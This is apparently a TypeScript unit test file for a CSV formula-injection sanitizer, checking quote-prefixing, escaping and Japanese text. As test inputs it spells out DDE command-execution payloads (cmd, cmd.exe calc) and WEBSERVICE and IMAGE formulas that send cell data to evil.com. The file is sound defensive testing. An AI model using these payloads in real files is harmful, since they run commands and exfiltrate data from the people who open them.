/**
 * csvSanitizer.ts ユニットテスト
 *
 * CSV Injection (Formula Injection) 対策のテスト
 */
import { describe, it, expect } from 'vitest';
import { sanitizeCSVValue, isDangerousCSVValue, formatNumberForCSV } from './csvSanitizer';

describe('csvSanitizer', () => {
  describe('sanitizeCSVValue', () => {
    describe('CSV Injection対策', () => {
      it('should prefix "=" with single quote', () => {
        expect(sanitizeCSVValue('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
      });

      it('should prefix "+" with single quote', () => {
        expect(sanitizeCSVValue('+1234567890')).toBe("'+1234567890");
      });

      it('should prefix "-" with single quote', () => {
        expect(sanitizeCSVValue('-cmd|calc')).toBe("'-cmd|calc");
      });

      it('should prefix "@" with single quote', () => {
        expect(sanitizeCSVValue('@SUM(A1:A10)')).toBe("'@SUM(A1:A10)");
      });

      it('should prefix tab character with single quote', () => {
        expect(sanitizeCSVValue('\tcmd')).toBe("'\tcmd");
      });

      it('should prefix carriage return with single quote', () => {
        expect(sanitizeCSVValue('\rcmd')).toBe("'\rcmd");
      });

      it('should not prefix normal text', () => {
        expect(sanitizeCSVValue('Normal text')).toBe('Normal text');
      });

      it('should not prefix numbers', () => {
        expect(sanitizeCSVValue('12345')).toBe('12345');
      });

      it('should handle DDE exploit attempt', () => {
        // DDE (Dynamic Data Exchange) exploit example
        const ddePayload = '=cmd|"/C calc"!A0';
        // ダブルクォートを含むので、エスケープしてダブルクォートで囲まれる
        const sanitized = sanitizeCSVValue(ddePayload);
        expect(sanitized).toContain("'=cmd|");  // プレフィックスあり
        expect(sanitized.includes('""')).toBe(true);  // ダブルクォートがエスケープされる
      });

      it('should handle hyperlink formula', () => {
        const hyperlinkPayload = '=HYPERLINK("http://malicious.com")';
        // ダブルクォートを含むので、エスケープしてダブルクォートで囲まれる
        const sanitized = sanitizeCSVValue(hyperlinkPayload);
        expect(sanitized).toContain("'=HYPERLINK");  // プレフィックスあり
        expect(sanitized.includes('""')).toBe(true);  // ダブルクォートがエスケープされる
      });
    });

    describe('通常のCSVエスケープ', () => {
      it('should wrap value with commas in double quotes', () => {
        expect(sanitizeCSVValue('Hello, World')).toBe('"Hello, World"');
      });

      it('should wrap value with newlines in double quotes', () => {
        expect(sanitizeCSVValue('Line1\nLine2')).toBe('"Line1\nLine2"');
      });

      it('should escape and wrap value with double quotes', () => {
        expect(sanitizeCSVValue('Say "Hello"')).toBe('"Say ""Hello"""');
      });

      it('should handle both comma and double quote', () => {
        expect(sanitizeCSVValue('Hello, "World"')).toBe('"Hello, ""World"""');
      });
    });

    describe('特殊ケース', () => {
      it('should return empty string for empty input', () => {
        expect(sanitizeCSVValue('')).toBe('');
      });

      it('should handle number input converted to string', () => {
        // @ts-expect-error - testing type coercion
        expect(sanitizeCSVValue(123)).toBe('123');
      });

      it('should handle null/undefined by converting to string', () => {
        // @ts-expect-error - testing edge case
        expect(sanitizeCSVValue(null)).toBe('null');
        // @ts-expect-error - testing edge case
        expect(sanitizeCSVValue(undefined)).toBe('undefined');
      });

      it('should handle combined dangerous char and comma', () => {
        expect(sanitizeCSVValue('=SUM(A,B)')).toBe("\"'=SUM(A,B)\"");
      });

      it('should handle combined dangerous char and newline', () => {
        expect(sanitizeCSVValue('=A1\n+B1')).toBe("\"'=A1\n+B1\"");
      });
    });

    describe('日本語対応', () => {
      it('should handle Japanese text', () => {
        expect(sanitizeCSVValue('こんにちは')).toBe('こんにちは');
      });

      it('should handle Japanese text with comma', () => {
        expect(sanitizeCSVValue('東京, 日本')).toBe('"東京, 日本"');
      });

      it('should prefix formula in Japanese context', () => {
        expect(sanitizeCSVValue('=合計')).toBe("'=合計");
      });
    });
  });

  describe('isDangerousCSVValue', () => {
    it('should return true for "=" prefix', () => {
      expect(isDangerousCSVValue('=SUM(A1)')).toBe(true);
    });

    it('should return true for "+" prefix', () => {
      expect(isDangerousCSVValue('+123')).toBe(true);
    });

    it('should return true for "-" prefix', () => {
      expect(isDangerousCSVValue('-cmd')).toBe(true);
    });

    it('should return true for "@" prefix', () => {
      expect(isDangerousCSVValue('@SUM')).toBe(true);
    });

    it('should return true for tab prefix', () => {
      expect(isDangerousCSVValue('\tvalue')).toBe(true);
    });

    it('should return true for carriage return prefix', () => {
      expect(isDangerousCSVValue('\rvalue')).toBe(true);
    });

    it('should return false for normal text', () => {
      expect(isDangerousCSVValue('Normal text')).toBe(false);
    });

    it('should return false for empty string', () => {
      expect(isDangerousCSVValue('')).toBe(false);
    });

    it('should return false for null/undefined', () => {
      // @ts-expect-error - testing edge case
      expect(isDangerousCSVValue(null)).toBe(false);
      // @ts-expect-error - testing edge case
      expect(isDangerousCSVValue(undefined)).toBe(false);
    });

    it('should return false for dangerous char in middle', () => {
      expect(isDangerousCSVValue('Hello=World')).toBe(false);
    });
  });

  describe('formatNumberForCSV', () => {
    it('should format positive number', () => {
      expect(formatNumberForCSV(123)).toBe('123');
    });

    it('should format negative number', () => {
      expect(formatNumberForCSV(-456)).toBe('-456');
    });

    it('should format zero', () => {
      expect(formatNumberForCSV(0)).toBe('0');
    });

    it('should format decimal number', () => {
      expect(formatNumberForCSV(3.14159)).toBe('3.14159');
    });

    it('should format large number', () => {
      expect(formatNumberForCSV(1000000)).toBe('1000000');
    });
  });

  describe('OWASP CSV Injection scenarios', () => {
    /**
     * 参考: OWASP CSV Injection
     * https://owasp.org/www-community/attacks/CSV_Injection
     */

    it('should sanitize DDE command execution payload', () => {
      const payload = '=cmd|"/C notepad"!_xlbgnm.A1';
      const sanitized = sanitizeCSVValue(payload);
      // ダブルクォートを含むので、全体がダブルクォートで囲まれるため、"'=... となる
      expect(sanitized).toContain("'=cmd|");
    });

    it('should sanitize PowerShell execution payload', () => {
      const payload = "=MSEXCEL|'\\..\\..\\Windows\\System32\\cmd.exe /c calc'!''";
      const sanitized = sanitizeCSVValue(payload);
      expect(sanitized.startsWith("'")).toBe(true);
    });

    it('should sanitize external data fetch payload', () => {
      const payload = '=WEBSERVICE("http://evil.com/?data="&A1)';
      const sanitized = sanitizeCSVValue(payload);
      // ダブルクォートを含むので、全体がダブルクォートで囲まれるため、"'=... となる
      expect(sanitized).toContain("'=WEBSERVICE");
    });

    it('should sanitize image load payload for data exfiltration', () => {
      const payload = '=IMAGE("http://evil.com/log?data="&A1)';
      const sanitized = sanitizeCSVValue(payload);
      // ダブルクォートを含むので、全体がダブルクォートで囲まれるため、"'=... となる
      expect(sanitized).toContain("'=IMAGE");
    });
  });
});
